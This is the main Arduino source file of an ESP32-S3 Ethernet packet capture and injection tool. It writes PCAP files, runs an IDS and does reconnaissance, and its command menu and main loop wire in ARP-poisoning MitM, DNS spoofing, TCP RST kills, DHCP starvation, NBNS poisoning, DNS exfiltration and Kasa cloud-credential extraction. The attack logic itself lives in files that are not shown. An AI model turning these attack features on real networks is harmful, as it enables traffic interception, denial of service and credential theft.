/*
 * ESP32-S3-ETH Packet Capture & Injection Tool
 *
 * Captures raw Ethernet frames via W5500 MACRAW mode
 * and writes them to SD card in PCAP format (readable by Wireshark).
 * Can also craft and inject packets onto the wire.
 *
 * Board: ESP32S3 Dev Module (Waveshare ESP32-S3-ETH)
 *
 * Pin mapping:
 *   W5500 (SPI2): MISO=12, MOSI=11, SCK=13, CS=14, RST=9, INT=10
 *   SD Card (SPI3): MISO=5, MOSI=6, SCK=7, CS=4
 *
 * Serial commands:
 *   s              - stop/start capture
 *   f              - show current filter / help
 *   f none         - clear all filters (capture everything)
 *   f arp          - capture only ARP
 *   f tcp/udp/icmp - capture only that protocol
 *   f port 80      - capture only port 80
 *   f ip X.X.X.X   - capture only that IP
 *   f mac XX:XX:.. - capture only that MAC
 *
 *   send ping X.X.X.X              - send ICMP echo request
 *   send arp X.X.X.X               - send ARP who-has request
 *   send udp X.X.X.X PORT message  - send UDP packet with payload
 *   send raw HEXDATA               - send raw Ethernet frame from hex
 *
 *   recon stp                       - show STP topology
 *   recon stp on/off                - live BPDU monitoring
 *
 *   stats                            - show live packet statistics
 *   stats auto [sec]                 - auto-print stats periodically
 *   hexdump on/off                   - live hex packet dump to serial
 *   hexdump pcap on/off              - binary PCAP stream over serial
 *   syslog X.X.X.X [port]            - forward IDS alerts via UDP syslog
 *   config save/load/clear           - persist settings to flash (NVS)
 *
 *   dnsspoof start X.X.X.X          - spoof all DNS queries to IP
 *   dnsspoof add domain X.X.X.X    - spoof specific domain
 *   dnsspoof stop                   - disable DNS spoofing
 *   dnsspoof list                   - show active spoof rules
 *
 *   mitm start X.X.X.X             - ARP poison victim <-> gateway
 *   mitm stop                       - stop MitM, restore ARP
 *   mitm status                     - show MitM state
 */

#include <Adafruit_NeoPixel.h>
#include <Ethernet2.h>
#include <mbedtls/aes.h>  // Hardware-accelerated AES for tunnel
#include <Preferences.h>  // ESP32 NVS (non-volatile storage)
#include <SD.h>
#include <SPI.h>
#include <utility/socket.h>
#include <utility/w5500.h>

#include "arp_table.h"
#include "attack_arp_mitm.h"
#include "attack_dhcp_starve.h"
#include "attack_dns_spoof.h"
#include "attack_mac_spoof.h"
#include "attack_nbns_poison.h"
#include "attack_tcp_rst.h"
#include "config.h"
#include "eth_frame.h"
#include "filter.h"
#include "hexdump.h"
#include "ids.h"
#include "inject.h"
#include "ip_util.h"
#include "led.h"
#include "network_map.h"
#include "nvs_config.h"
#include "packet_replay.h"
#include "pcap_writer.h"
#include "pins.h"
#include "dns_util.h"
#include "recon_arp_sweep.h"
#include "recon_lldp.h"
#include "recon_mdns.h"
#include "recon_netbios.h"
#include "recon_os_fingerprint.h"
#include "recon_port_scan.h"
#include "recon_service_scan.h"
#include "recon_stp.h"
#include "recon_vlan_discover.h"
#include "spi_bus.h"
#include "state.h"
#include "stats.h"
#include "svc_dns_covert.h"
#include "svc_syslog.h"
#include "svc_udp_tunnel.h"

// Capture config constants live in config.h.

// SPI ownership and the `sdSPI` handle live in spi_bus.{h,cpp}.

// packetBuf, txBuf, and capturing live in state.{h,cpp}.
// captureFile, packetCount, droppedCount, txCount, fileIndex,
// lastCommit, uncommittedPkts, currentFilename live in pcap_writer.{h,cpp}.

// IRC server config constants live in config.h.

enum IrcTcpState : uint8_t {
  IRC_TCP_FREE = 0,
  IRC_TCP_SYN_RCVD,
  IRC_TCP_ESTABLISHED,
  IRC_TCP_CLOSING
};

enum IrcRegState : uint8_t {
  IRC_REG_NONE = 0,
  IRC_REG_NICK = 1,
  IRC_REG_USER = 2,
  IRC_REG_DONE = 3
};

struct IrcClient {
  IrcTcpState tcpState;
  IrcRegState regState;
  uint8_t peerMAC[6];
  uint8_t peerIP[4];
  uint16_t peerPort;
  uint32_t mySeq;
  uint32_t myAck;
  uint32_t lastActivity;
  uint32_t lastPingSent;
  bool pongPending;
  char nick[IRC_NICK_LEN];
  char user[IRC_NICK_LEN];
  uint8_t channels;  // bitmask of joined channels
  char lineBuf[IRC_LINE_BUF];
  uint16_t linePos;
};

struct IrcChannel {
  bool active;
  char name[IRC_CHAN_LEN];
  uint8_t memberMask;  // bitmask of client indices
};

static IrcClient ircClients[IRC_MAX_CLIENTS];
static IrcChannel ircChannels[IRC_MAX_CHANNELS];
static bool ircServerActive = false;

// MAC address for the W5500
// mac, ourIP, ourGW, ourSubnet, ourDNS live in state.{h,cpp}.

// Static fallback (used only if DHCP fails)
static const uint8_t fallbackIP[4] = {192, 168, 50, 200};
static const uint8_t fallbackGW[4] = {192, 168, 50, 1};
static const uint8_t fallbackSubnet[4] = {255, 255, 255, 0};

// Ethernet frame offsets, EtherTypes, IP protocol numbers, and wire-format
// byte-order helpers live in eth_frame.h.

// Subsystem config constants (IDS, STP, MitM, DNS spoof, stats, hexdump,
// NVS, syslog, MAC spoofing, replay, TCP RST, DHCP starve, NBNS, OS
// fingerprinting, LLDP, mDNS, tunnel, DNS covert, Kasa) and the NeoPixel
// color palette all live in config.h.

Adafruit_NeoPixel pixel(1, NEOPIXEL_PIN, NEO_GRB + NEO_KHZ800);

// ArpEntry is declared in arp_table.h. The storage now lives in
// ids.cpp alongside the other IDS tables.

// AlertLevel, DhcpServer, ScanTracker, DnsQuery, idsEnabled,
// arpTable storage, knownDhcp, scanTrackers, dnsTrack, alertCount,
// alertLedUntil, currentLedColor all live in ids.{h,cpp}.


// ── ARP MitM State ──

// ── DNS Spoof State ──

// ── Syslog State ──


// ── NVS ──

// MAC spoofing, TCP RST injection, DHCP starvation, NBNS poison
// state all live in their respective attack_*.cpp files.

// NetbiosHost / netbiosTable / netbiosCount live in recon_netbios.{h,cpp}.

// OsFingerprint / fpTable live in recon_os_fingerprint.{h,cpp}.

// ── LLDP/CDP Neighbor Table ──

// ── mDNS/NBNS Sniffer State ──
// MdnsHost / mdnsTable live in recon_mdns.{h,cpp}.

// ── Encrypted UDP Tunnel State ──
uint32_t covertSentCount = 0;

// ── Kasa Smart Device State ──
static uint8_t kasaBuf[KASA_BUF_SIZE];  // Encrypt/decrypt + response buffer

// FilterType, PacketFilter, and `activeFilter` live in filter.{h,cpp}.

// PcapGlobalHeader and PcapPacketHeader live in pcap_writer.h.

// ── Forward declarations ──
void resetW5500();
// openNewCaptureFile, commitCaptureFile, writePcapGlobalHeader,
// writePcapPacket are declared in pcap_writer.h.
// IRC Server
void parseIrcCommand(const char* cmd);
void ircStart();
void ircStop();
void ircStatus();
void ircCheckIncomingTcp(const uint8_t* pkt, uint16_t len);
void ircTick();
void ircSendToClient(uint8_t idx, const char* data, uint16_t len);
void ircSendLine(uint8_t idx, const char* fmt, ...);
void ircBroadcastChannel(uint8_t chanIdx, uint8_t exceptClient, const char* fmt, ...);
void ircProcessLine(uint8_t idx, char* line);
void ircDisconnect(uint8_t idx, const char* reason);
void ircSendWelcome(uint8_t idx);
// buildTcpSyn / buildTcpSynAck / buildTcpFinAck are declared in inject.h.
// packetMatchesFilter, parseFilterCommand, printCurrentFilter are declared in filter.h.
void handleSerialCommand();
void printMenu();
void parseSendCommand(const char* cmd);

// IDS / Detection
// All IDS surface (parseIdsCommand, idsAnalyzePacket, idsCheckArp,
// idsCheckDhcp, idsCheckCleartext, idsCheckDns, idsCheckPortScan,
// idsAlert, idsSetLed, idsUpdateLed, idsInitTables, idsPrintStats)
// is declared in ids.h.

// Packet crafting
// switchToEthSPI, switchToSdSPI are declared in spi_bus.h.
// buildEthHeader, buildIPv4Header, ipChecksum, tcpChecksum are declared in eth_frame.h.
// sendRawFrame, sendArpRequest, sendPing, sendUDP, sendRawHex, hexCharToVal,
// buildTcpSyn, buildTcpSynAck, buildTcpFinAck are declared in inject.h.

// Recon
void parseReconCommand(const char* cmd);
// reconArpSweep is declared in recon_arp_sweep.h.
// reconSynProbe is declared in recon_port_scan.h.
// reconVlanDiscover and buildVlanFrame are declared in recon_vlan_discover.h.
// buildTcpSyn is declared in inject.h.

// reconServiceScan is declared in recon_service_scan.h.

// STP Topology Mapping is declared in recon_stp.h.

// ARP MitM — declared in attack_arp_mitm.h.

// DNS Spoofing — declared in attack_dns_spoof.h.
// dnsDecodeName is declared in dns_util.h.

// Live Stats — declared in stats.h.
void statsReset();

// Hexdump / PCAP-over-Serial — declared in hexdump.h.

// Syslog Forwarding — declared in svc_syslog.h.

// Persistent Config (NVS) — declared in nvs_config.h.

// MAC Spoofing — declared in attack_mac_spoof.h.
// Packet Replay — declared in packet_replay.h.
// TCP RST Injection — declared in attack_tcp_rst.h.
// DHCP Starvation — declared in attack_dhcp_starve.h.
// NBNS/LLMNR Poisoning — declared in attack_nbns_poison.h.

// NetBIOS Recon — declared in recon_netbios.h.

// OS Fingerprinting — declared in recon_os_fingerprint.h.

// LLDP/CDP — declared in recon_lldp.h.

// mDNS/NBNS Sniffer
// mdnsCheckPacket / mdnsPrintTable are declared in recon_mdns.h.

// Encrypted UDP Tunnel — declared in svc_udp_tunnel.h.
// DNS Covert Channel — declared in svc_dns_covert.h.

// Kasa Smart Device Query
void parseKasaCommand(const char* cmd);
int16_t kasaSendRecv(const uint8_t* targetIP, const char* jsonCmd, char* outJson, uint16_t maxOut);
void kasaQuerySysinfo(const uint8_t* targetIP);
void kasaQueryCloud(const uint8_t* targetIP);
uint16_t kasaEncrypt(const char* json, uint8_t* out, uint16_t maxOut);
uint16_t kasaDecrypt(const uint8_t* data, uint16_t len, char* out, uint16_t maxOut);

// Network Map — declared in network_map.h.
// resolveMacForIP, buildTcpAck, buildTcpDataPush, buildTcpRst are declared in inject.h.

// ── Serial input buffer ──
char cmdBuf[256];  // larger for hex payloads
uint8_t cmdPos = 0;

void setup() {
  Serial.begin(115200);
  delay(2000);

  // ── NeoPixel init ──
  pixel.begin();
  pixel.setBrightness(30);
  idsSetLed(COLOR_BLUE);

  Serial.println();
  Serial.println("  ┌─────────────────────────────────────────┐");
  Serial.println("  │         eth0 — Network Security Tool     │");
  Serial.println("  │     ESP32-S3-ETH  /  W5500 + SD Card    │");
  Serial.println("  └─────────────────────────────────────────┘");
  Serial.println();

  // ── Deselect both SPI devices to prevent bus contention ──
  pinMode(ETH_CS, OUTPUT);
  pinMode(SD_CS, OUTPUT);
  digitalWrite(ETH_CS, HIGH);
  digitalWrite(SD_CS, HIGH);

  // ── Enable internal pull-ups on SD MISO and CS ──
  // GPIO-matrix-routed SPI has no hardware pull-ups; floating MISO
  // causes the SD card to miss init responses intermittently.
  pinMode(SD_MISO, INPUT_PULLUP);
  pinMode(SD_CS, OUTPUT);
  digitalWrite(SD_CS, HIGH);

  // ── Initialize default SPI bus with ETH pins (SPI2/FSPI) ──
  // Must happen BEFORE resetW5500/Ethernet.init since Ethernet2 uses SPI internally
  SPI.begin(ETH_SCK, ETH_MISO, ETH_MOSI, ETH_CS);

  // ── Reset W5500 ──
  resetW5500();

  // ── Initialize SD card on separate SPI bus (SPI3/HSPI) ──
  sdSPI.begin(SD_SCK, SD_MISO, SD_MOSI, SD_CS);
  delay(100);  // let bus settle after begin

  // SD cards need 74+ clock cycles with CS high before first command.
  // Send dummy bytes to provide those clocks.
  digitalWrite(SD_CS, HIGH);
  sdSPI.beginTransaction(SPISettings(400000, MSBFIRST, SPI_MODE0));
  for (int i = 0; i < 16; i++)
    sdSPI.transfer(0xFF);  // 128 clocks
  sdSPI.endTransaction();
  delay(10);

  // Retry SD init up to 5 times — intermittent failures are normal
  // on GPIO-matrix SPI, especially after cold boot.
  Serial.println("[SD] Initializing SD card...");
  bool sdOk = false;
  const uint32_t sdSpeeds[] = {4000000, 2000000, 1000000, 500000, 400000};
  for (int attempt = 0; attempt < 5 && !sdOk; attempt++) {
    uint32_t speed = sdSpeeds[attempt];
    if (attempt > 0) {
      Serial.printf("[SD] Retry %d/4 at %lu Hz...\n", attempt, speed);
      SD.end();
      delay(250);
      // Re-send dummy clocks before each retry
      digitalWrite(SD_CS, HIGH);
      sdSPI.beginTransaction(SPISettings(400000, MSBFIRST, SPI_MODE0));
      for (int i = 0; i < 16; i++)
        sdSPI.transfer(0xFF);
      sdSPI.endTransaction();
      delay(10);
    }
    sdOk = SD.begin(SD_CS, sdSPI, speed);
  }

  if (!sdOk) {
    Serial.println("[ERROR] SD card init failed after 5 attempts!");
    Serial.println("[ERROR] Check: card inserted? contacts clean? correct slot?");
    while (true)
      delay(1000);
  }
  Serial.printf("[SD] Card ready. Size: %llu MB\n", SD.cardSize() / (1024 * 1024));

  // ── Initialize W5500 Ethernet via DHCP ──
  // Ethernet.begin(mac) does DHCP using socket 0. We grab the lease,
  // save the assigned IP/GW/subnet/DNS, then close and reopen socket 0
  // as MACRAW for packet capture.
  Ethernet.init(ETH_CS);
  memcpy(originalMAC, mac, 6);  // Save original MAC before any spoofing

  Serial.print("[ETH] MAC: ");
  printMAC(mac);
  Serial.println();
  Serial.println("[ETH] Requesting IP via DHCP...");

  int dhcpResult = Ethernet.begin(mac);  // blocking DHCP, uses socket 0

  if (dhcpResult == 1) {
    // DHCP succeeded — copy the assigned addresses
    IPAddress lip = Ethernet.localIP();
    IPAddress lgw = Ethernet.gatewayIP();
    IPAddress lsn = Ethernet.subnetMask();
    IPAddress ldn = Ethernet.dnsServerIP();

    ourIP[0] = lip[0];
    ourIP[1] = lip[1];
    ourIP[2] = lip[2];
    ourIP[3] = lip[3];
    ourGW[0] = lgw[0];
    ourGW[1] = lgw[1];
    ourGW[2] = lgw[2];
    ourGW[3] = lgw[3];
    ourSubnet[0] = lsn[0];
    ourSubnet[1] = lsn[1];
    ourSubnet[2] = lsn[2];
    ourSubnet[3] = lsn[3];
    ourDNS[0] = ldn[0];
    ourDNS[1] = ldn[1];
    ourDNS[2] = ldn[2];
    ourDNS[3] = ldn[3];

    Serial.print("[ETH] DHCP OK! IP: ");
    printIP(ourIP);
    Serial.print("  GW: ");
    printIP(ourGW);
    Serial.print("  DNS: ");
    printIP(ourDNS);
    Serial.println();
  } else {
    // DHCP failed — use static fallback
    Serial.println("[ETH] DHCP failed, using static fallback.");
    memcpy(ourIP, fallbackIP, 4);
    memcpy(ourGW, fallbackGW, 4);
    memcpy(ourSubnet, fallbackSubnet, 4);
    ourDNS[0] = 8;
    ourDNS[1] = 8;
    ourDNS[2] = 8;
    ourDNS[3] = 8;

    // Re-init with static config so W5500 registers are set
    Ethernet.begin(mac, IPAddress(ourIP[0], ourIP[1], ourIP[2], ourIP[3]),
                   IPAddress(ourDNS[0], ourDNS[1], ourDNS[2], ourDNS[3]),
                   IPAddress(ourGW[0], ourGW[1], ourGW[2], ourGW[3]),
                   IPAddress(ourSubnet[0], ourSubnet[1], ourSubnet[2], ourSubnet[3]));

    Serial.print("[ETH] Static IP: ");
    printIP(ourIP);
    Serial.println();
  }

  // ── Clear Ping Block bit in W5500 Mode Register ──
  // MR bit 4 (0x10) = PB (Ping Block). When set, the W5500 hardware
  // silently drops ALL ICMP echo packets before they reach the socket.
  // We clear it so ICMP passes through to MACRAW.
  {
    uint8_t mr = w5500.readMR();
    if (mr & 0x10) {
      Serial.printf("[ETH] Clearing Ping Block bit (MR was 0x%02X)\n", mr);
      w5500.writeMR(mr & ~0x10);
    }
  }

  // ── Open MACRAW socket on socket 0 ──
  // Flag 0x40 = MF (MAC Filter disable for MACRAW on some W5500 revisions)
  // This enables promiscuous receive — capture ALL frames on the wire,
  // not just those addressed to our MAC or broadcast.
  close(RAW_SOCKET);
  uint8_t result = socket(RAW_SOCKET, SnMR::MACRAW, 0, 0);
  if (result == 0) {
    Serial.println("[ERROR] Failed to open MACRAW socket!");
    while (true)
      delay(1000);
  }

  // Disable MAC filter on socket 0 (Sn_MR bit 7 = MFEN on W5500)
  // When MFEN=1, only frames matching our MAC are received.
  // Clear it for promiscuous capture.
  {
    uint8_t snmr = w5500.readSnMR(RAW_SOCKET);
    if (snmr & 0x80) {
      w5500.writeSnMR(RAW_SOCKET, snmr & ~0x80);
      Serial.println("[ETH] MAC filter disabled (promiscuous mode)");
    }
  }

  Serial.println("[ETH] MACRAW socket opened on socket 0");

  // ── Open first capture file ──
  if (!openNewCaptureFile()) {
    Serial.println("[ERROR] Failed to create capture file!");
    while (true)
      delay(1000);
  }

  // ── Initialize IDS tables ──
  idsInitTables();
  stpInitTable();
  dnsSpoofInitRules();
  configLoad();  // restore saved settings from NVS

  capturing = true;
  lastCommit = millis();
  idsSetLed(COLOR_GREEN);

  Serial.println("[CAPTURE] Started. Filter: none (capturing all)");
  Serial.printf("[IDS] Detection engine %s\n", idsEnabled ? "ACTIVE" : "disabled");
  Serial.println();
  Serial.println("  Type 'help' for full command list.");
  Serial.println();
}

void loop() {
  // ── Handle serial commands ──
  handleSerialCommand();

  if (!capturing) {
    delay(10);
    return;
  }

  // ── Check for received packets ──
  switchToEthSPI();

  uint16_t rxSize = w5500.getRXReceivedSize(RAW_SOCKET);

  if (rxSize > 0) {
    uint16_t len = recvfrom(RAW_SOCKET, packetBuf, MAX_FRAME_SIZE, NULL, NULL);

    if (len > 0 && len <= MAX_FRAME_SIZE) {
      // ── STP BPDU parsing (runs on all packets) ──
      stpCheckBpdu(packetBuf, len);

      // ── IDS analysis runs on ALL packets (before filter) ──
      if (idsEnabled) {
        idsAnalyzePacket(packetBuf, len);
      }

      // ── DNS Spoof: intercept queries and send fake responses ──
      if (dnsSpoofEnabled) {
        dnsSpoofCheck(packetBuf, len);
      }

      // ── Live stats tracking (runs on ALL packets) ──
      statsTrackPacket(packetBuf, len);

      // ── Passive analyzers (run on ALL packets) ──
      lldpCheckFrame(packetBuf, len);
      fpAnalyzePacket(packetBuf, len);
      mdnsCheckPacket(packetBuf, len);
      tcpTrackPacket(packetBuf, len);
      netbiosParseResponse(packetBuf, len);
      if (poisonEnabled)
        poisonCheckPacket(packetBuf, len);
      if (tunnelActive)
        tunnelCheckIncoming(packetBuf, len);

      // ── ARP responder: reply to ARP requests for our IP ──
      // In MACRAW mode the W5500 IP stack is bypassed, so we must
      // handle ARP ourselves or nobody can send us unicast packets.
      if (len > ETH_HEADER_LEN + 28) {
        uint16_t etype = pktRead16(packetBuf + ETH_TYPE);
        if (etype == ETHERTYPE_ARP) {
          const uint8_t* arp = packetBuf + ETH_HEADER_LEN;
          uint16_t op = pktRead16(arp + 6);
          const uint8_t* targetIP_arp = arp + 24;  // target IP in ARP request
          if (op == 1 && memcmp(targetIP_arp, ourIP, 4) == 0) {
            // Someone is asking "who has ourIP?" — reply with our MAC
            const uint8_t* requesterMAC = arp + 8;
            const uint8_t* requesterIP = arp + 14;

            uint16_t pos = 0;
            pos = buildEthHeader(txBuf, requesterMAC, ETHERTYPE_ARP);

            pktWrite16(txBuf + pos, 0x0001);
            pos += 2;  // HW type: Ethernet
            pktWrite16(txBuf + pos, 0x0800);
            pos += 2;          // Proto: IPv4
            txBuf[pos++] = 6;  // HW addr len
            txBuf[pos++] = 4;  // Proto addr len
            pktWrite16(txBuf + pos, 0x0002);
            pos += 2;  // Op: Reply
            memcpy(txBuf + pos, mac, 6);
            pos += 6;  // Sender MAC (us)
            memcpy(txBuf + pos, ourIP, 4);
            pos += 4;  // Sender IP (us)
            memcpy(txBuf + pos, requesterMAC, 6);
            pos += 6;  // Target MAC
            memcpy(txBuf + pos, requesterIP, 4);
            pos += 4;  // Target IP
            while (pos < 60)
              txBuf[pos++] = 0;
            sendRawFrame(txBuf, pos);
          }
        }
      }

      // ── IRC server: handle incoming TCP connections ──
      if (ircServerActive) {
        ircCheckIncomingTcp(packetBuf, len);
      }

      // ── Apply capture filter ──
      if (!packetMatchesFilter(packetBuf, len)) {
        droppedCount++;
        return;
      }

      writePcapPacket(packetBuf, len);
      packetCount++;
      uncommittedPkts++;

      // ── Hexdump / PCAP-over-serial output ──
      if (hexdumpEnabled)
        hexdumpPacket(packetBuf, len);
      if (hexdumpPcapSerial)
        pcapSerialPacket(packetBuf, len);

      if (packetCount % 100 == 0) {
        Serial.printf("[CAPTURE] %u saved | %u filtered out | file: capture_%04u.pcap\n",
                      packetCount, droppedCount, fileIndex);
      }

      // Rotate file if too large
      if (captureFile.position() >= MAX_FILE_SIZE) {
        captureFile.close();
        uncommittedPkts = 0;
        Serial.printf("[CAPTURE] File rotated at %u packets.\n", packetCount);
        if (!openNewCaptureFile()) {
          Serial.println("[ERROR] Failed to open new capture file!");
          capturing = false;
          return;
        }
      }

      // Commit after N packets — close/reopen so FAT metadata is safe
      if (uncommittedPkts >= COMMIT_PKT_BATCH) {
        commitCaptureFile();
      }
    }
  }

  // ── Periodic commit (close + reopen) so FAT stays consistent ──
  // This is what protects against power loss — close() writes the
  // directory entry and FAT chain, so the file is always valid on disk.
  if (uncommittedPkts > 0 && (millis() - lastCommit >= COMMIT_INTERVAL)) {
    commitCaptureFile();
  }

  // ── Auto-stats output ──
  if (statsAutoEnabled && (millis() - statsLastAuto >= statsAutoInterval)) {
    statsPrint();
    statsLastAuto = millis();
  }

  // ── MAC auto-rotate ──
  if (macAutoEnabled && (millis() - macAutoLastRotate >= macAutoIntervalMs)) {
    macRandom();
    macAutoLastRotate = millis();
  }

  // ── DHCP starvation ──
  if (dhcpStarveActive && (millis() - dhcpStarveLastSend >= DHCPSTARVE_INTERVAL)) {
    dhcpStarveSendDiscover();
    dhcpStarveLastSend = millis();
  }

  // ── MitM: periodic ARP poison ──
  if (mitmActive && (millis() - mitmLastPoison >= MITM_POISON_INTERVAL)) {
    mitmSendPoison();
    mitmLastPoison = millis();
  }

  // ── IRC server: periodic ping/timeout check ──
  if (ircServerActive) {
    ircTick();
  }

  // ── Update NeoPixel (revert to green after alert timeout) ──
  idsUpdateLed();
}

// ══════════════════════════════════════════
//  SPI Bus Switching
// ══════════════════════════════════════════

// switchToEthSPI() and switchToSdSPI() live in spi_bus.cpp.

// ══════════════════════════════════════════
//  Packet Filter Engine
// ══════════════════════════════════════════

// packetMatchesFilter lives in filter.cpp.

// ══════════════════════════════════════════
//  Packet Crafting & Injection
// ══════════════════════════════════════════

// Send a raw Ethernet frame via MACRAW socket.
// We bypass sendto() because it checks addr/port which are irrelevant
// for MACRAW and cause it to silently fail when NULL/0 are passed.
// sendRawFrame, sendArpRequest, sendPing, sendUDP, sendRawHex, hexCharToVal
// live in inject.cpp.

// ══════════════════════════════════════════
//  Serial Command Handler
// ══════════════════════════════════════════

void printMenu() {
  Serial.println();
  Serial.println("  ┌─────────────────────────────────────────────────────────────┐");
  Serial.println("  │                     eth0 — Command Menu                     │");
  Serial.println("  └─────────────────────────────────────────────────────────────┘");

  Serial.println();
  Serial.println("  CAPTURE & FILTERING");
  Serial.println("  ───────────────────────────────────────────────────────────────");
  Serial.println("    s                          Toggle capture on/off");
  Serial.println("    f [none|arp|tcp|udp|icmp]  Set protocol filter");
  Serial.println("    f port <N>                 Filter by port number");
  Serial.println("    f ip <X.X.X.X>             Filter by IP address");
  Serial.println("    f mac <XX:XX:..>           Filter by MAC address");

  Serial.println();
  Serial.println("  PACKET INJECTION");
  Serial.println("  ───────────────────────────────────────────────────────────────");
  Serial.println("    send ping <IP>              ICMP echo request");
  Serial.println("    send arp <IP>               ARP who-has query");
  Serial.println("    send udp <IP> <PORT> <msg>  UDP packet with payload");
  Serial.println("    send raw <HEX>              Raw Ethernet frame from hex");

  Serial.println();
  Serial.println("  RECONNAISSANCE");
  Serial.println("  ───────────────────────────────────────────────────────────────");
  Serial.println("    recon sweep [IP/CIDR]       ARP sweep (CIDR /16-/30, default local /24)");
  Serial.println("    recon ports <IP> [p1,p2..]  TCP SYN port probe");
  Serial.println("    recon scan <IP> [p1,p2..]   Service scan + banner grab");
  Serial.println("    recon vlan                  802.1Q VLAN discovery");
  Serial.println("    recon stp [on|off|clear]    STP topology mapping");
  Serial.println("    recon lldp                  LLDP/CDP switch neighbors");
  Serial.println("    recon mdns                  mDNS/NBNS host discovery");
  Serial.println("    recon netbios [IP|sweep]    NetBIOS name table / sweep");
  Serial.println("    recon fingerprint           Passive OS fingerprinting");

  Serial.println();
  Serial.println("  ATTACKS");
  Serial.println("  ───────────────────────────────────────────────────────────────");
  Serial.println("    mitm start <IP>             ARP poison victim <-> gateway");
  Serial.println("    mitm stop                   Stop MitM, restore ARP");
  Serial.println("    mitm status                 Show MitM state");
  Serial.println("    dnsspoof start <IP>         Spoof all DNS to IP");
  Serial.println("    dnsspoof add <dom> <IP>     Spoof specific domain");
  Serial.println("    dnsspoof stop | list        Disable / show rules");
  Serial.println("    kill <IP>[:<port>]           TCP RST connection kill");
  Serial.println("    kill list                   Show tracked connections");
  Serial.println("    dhcpstarve start | stop     DHCP pool exhaustion");
  Serial.println("    poison on | off             NBNS/LLMNR name poisoning");

  Serial.println();
  Serial.println("  COVERT");
  Serial.println("  ───────────────────────────────────────────────────────────────");
  Serial.println("    tunnel start <IP> <KEY>     AES-128 encrypted UDP tunnel");
  Serial.println("    tunnel send <message>       Send via encrypted tunnel");
  Serial.println("    tunnel stop                 Disconnect tunnel");
  Serial.println("    covert dns server <IP>      Set DNS exfil server");
  Serial.println("    covert dns send \"<data>\"    Exfiltrate via DNS queries");

  Serial.println();
  Serial.println("  IDENTITY");
  Serial.println("  ───────────────────────────────────────────────────────────────");
  Serial.println("    mac                         Show current MAC address");
  Serial.println("    mac set <XX:XX:..>          Spoof MAC address");
  Serial.println("    mac random                  Random MAC");
  Serial.println("    mac reset                   Restore original MAC");
  Serial.println("    mac auto <sec> | off        Auto-rotate MAC");

  Serial.println();
  Serial.println("  MONITORING & IDS");
  Serial.println("  ───────────────────────────────────────────────────────────────");
  Serial.println("    ids                         Toggle IDS on/off");
  Serial.println("    ids stats                   Alert statistics");
  Serial.println("    ids arp                     ARP binding table");
  Serial.println("    ids dhcp                    Known DHCP servers");
  Serial.println("    ids reset                   Clear all IDS tables");
  Serial.println("    stats [auto <sec>|off|reset] Live packet stats");
  Serial.println("    syslog <IP> [port]          Forward alerts via syslog");
  Serial.println("    syslog off | test           Disable / send test");

  Serial.println();
  Serial.println("  UTILITIES");
  Serial.println("  ───────────────────────────────────────────────────────────────");
  Serial.println("    replay <file.pcap> [ms]     Replay PCAP from SD card");
  Serial.println("    hexdump on | off            Live hex packet dump");
  Serial.println("    hexdump pcap on | off       Binary PCAP over serial");
  Serial.println("    irc start                   Start IRC server (:6667)");
  Serial.println("    irc stop                    Stop IRC server");
  Serial.println("    irc status                  Show connected clients");
  Serial.println("    kasa <IP>                   Query TP-Link Kasa device info + GPS");
  Serial.println("    kasa cloud <IP>             Extract cloud account credentials");
  Serial.println("    config save | load | clear  Persistent settings (NVS)");
  Serial.println("    map                         Full network map summary");
  Serial.println("    help                        Show this menu");
  Serial.println();
}

void handleSerialCommand() {
  while (Serial.available()) {
    char c = Serial.read();
    if (c == '\n' || c == '\r') {
      if (cmdPos == 0)
        continue;
      cmdBuf[cmdPos] = '\0';

      char* cmd = cmdBuf;
      while (*cmd == ' ')
        cmd++;

      if (cmd[0] == 's' && (cmd[1] == '\0' || cmd[1] == ' ') && strncmp(cmd, "send", 4) != 0) {
        capturing = !capturing;
        if (capturing) {
          Serial.println("[CAPTURE] Resumed.");
        } else {
          commitCaptureFile();  // safe commit on pause
          Serial.printf("[CAPTURE] Paused. %u saved, %u filtered, %u sent.\n", packetCount,
                        droppedCount, txCount);
        }
      } else if (cmd[0] == 'f') {
        if (cmd[1] == '\0' || (cmd[1] == ' ' && cmd[2] == '\0')) {
          printCurrentFilter();
        } else {
          parseFilterCommand(cmd + 2);
        }
      } else if (strncmp(cmd, "map", 3) == 0 && (cmd[3] == '\0' || cmd[3] == ' ')) {
        printNetworkMap();
      } else if (strncmp(cmd, "help", 4) == 0) {
        printMenu();
      } else if (strncmp(cmd, "send ", 5) == 0) {
        parseSendCommand(cmd + 5);
      } else if (strncmp(cmd, "ids", 3) == 0) {
        parseIdsCommand(cmd + 3);
      } else if (strncmp(cmd, "recon", 5) == 0) {
        parseReconCommand(cmd + 5);
      } else if (strncmp(cmd, "stats", 5) == 0) {
        parseStatsCommand(cmd + 5);
      } else if (strncmp(cmd, "hexdump", 7) == 0) {
        parseHexdumpCommand(cmd + 7);
      } else if (strncmp(cmd, "mac ", 4) == 0) {
        parseMacCommand(cmd + 4);
      } else if (strncmp(cmd, "replay ", 7) == 0) {
        parseReplayCommand(cmd + 7);
      } else if (strncmp(cmd, "kill ", 5) == 0) {
        parseKillCommand(cmd + 5);
      } else if (strncmp(cmd, "dhcpstarve", 10) == 0) {
        parseDhcpStarveCommand(cmd + 10);
      } else if (strncmp(cmd, "poison", 6) == 0) {
        parsePoisonCommand(cmd + 6);
      } else if (strncmp(cmd, "tunnel", 6) == 0) {
        parseTunnelCommand(cmd + 6);
      } else if (strncmp(cmd, "covert", 6) == 0) {
        parseCovertCommand(cmd + 6);
      } else if (strncmp(cmd, "syslog", 6) == 0) {
        parseSyslogCommand(cmd + 6);
      } else if (strncmp(cmd, "config", 6) == 0) {
        parseConfigCommand(cmd + 6);
      } else if (strncmp(cmd, "dnsspoof", 8) == 0) {
        parseDnsSpoofCommand(cmd + 8);
      } else if (strncmp(cmd, "mitm", 4) == 0) {
        parseMitmCommand(cmd + 4);
      } else if (strncmp(cmd, "irc", 3) == 0) {
        parseIrcCommand(cmd + 3);
      } else if (strncmp(cmd, "kasa", 4) == 0) {
        parseKasaCommand(cmd + 4);
      } else {
        Serial.printf("[CMD] Unknown: '%s'. Type 'help' for commands.\n", cmd);
      }

      cmdPos = 0;
    } else if (cmdPos < sizeof(cmdBuf) - 1) {
      cmdBuf[cmdPos++] = c;
    }
  }
}

void parseSendCommand(const char* cmd) {
  while (*cmd == ' ')
    cmd++;

  if (strncmp(cmd, "ping ", 5) == 0) {
    uint8_t targetIP[4];
    if (parseIP(cmd + 5, targetIP)) {
      sendPing(targetIP);
    } else {
      Serial.println("[TX] Invalid IP. Use: send ping 192.168.1.1");
    }
